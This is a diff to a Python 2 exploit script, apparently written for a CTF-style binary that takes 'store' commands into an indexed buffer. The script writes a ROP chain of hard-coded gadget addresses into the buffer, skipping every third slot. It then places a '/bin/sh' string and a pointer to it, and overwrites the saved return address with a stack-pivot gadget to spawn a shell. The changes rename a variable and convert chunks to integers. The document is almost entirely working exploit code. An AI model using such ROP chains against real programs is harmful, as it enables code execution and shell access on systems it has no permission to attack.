@@ -15,20 +15,20 @@ RET_4 = 0x0804854b
 
 BUF_ADDR_PTR = 0xbffff518
 BIN_SH_IDX = 61
-BINSH_ADDR = BUF_ADDR_PTR + BIN_SH_IDX * 4
+BIN_SH_ADDR = BUF_ADDR_PTR + BIN_SH_IDX * 4
 
 # Start from index 0 (Quend)
 payload += str(JUNK)
 # Index 1
 payload += struct.pack('<L', POP_ECX_EBX)
 # Index 2
-payload += struct.pack('<L', BINSH_ADDR + 12)  # ??
+payload += struct.pack('<L', BIN_SH_ADDR + 12)  # ??
 # Index 3 (Quend)
 payload += str(JUNK)
 # Index 4
 payload += struct.pack('<L', POP_EBX_EDI)
 # Index 5
-payload += struct.pack('<L', BINSH_ADDR)
+payload += struct.pack('<L', BIN_SH_ADDR)
 # Index 6 (Quend)
 payload += str(JUNK)
 # Index 7
@@ -53,18 +53,17 @@ idx = 0
 # Write ROP chain to fragmented buffer 
 for chunk in [payload[i: i + 4] for i in range(0, len(payload), 4)]:
     if idx % 3 == 0:
-        if str(JUNK) in chunk:
-            idx += 1
-            continue
+        idx += 1
     else:
-        print "store\n" + chunk + "\n" + str(idx) + "\n"
+        val = str(struct.unpack("<L", chunk)[0])
+        print "store\n" + val + "\n" + str(idx) + "\n"
         idx += 1
 
 print "store\n" + str(struct.unpack("<L", b"/bin")[0]) + "\n" + str(BIN_SH_IDX) + "\n"
 print "store\n" + str(struct.unpack("<L", b"/sh\x00")[0]) + "\n" + str(BIN_SH_IDX + 1) + "\n"
 # Write ptr to //bin//sh string
-print "store\n" + str(BUF_ADDR_PTR + BIN_SH_IDX * 4) + "\n" + str(BIN_SH_IDX + 3) + "\n"
+print "store\n" + str(BIN_SH_ADDR) + "\n" + str(BIN_SH_IDX + 3) + "\n"
 # Overwrite RA with pivot gadget
 print "store\n" + str(PIVOT_ESP_44) + "\n" + str(-11) + "\n"
 # End the party!
-print "quit"
+print "quit\n"
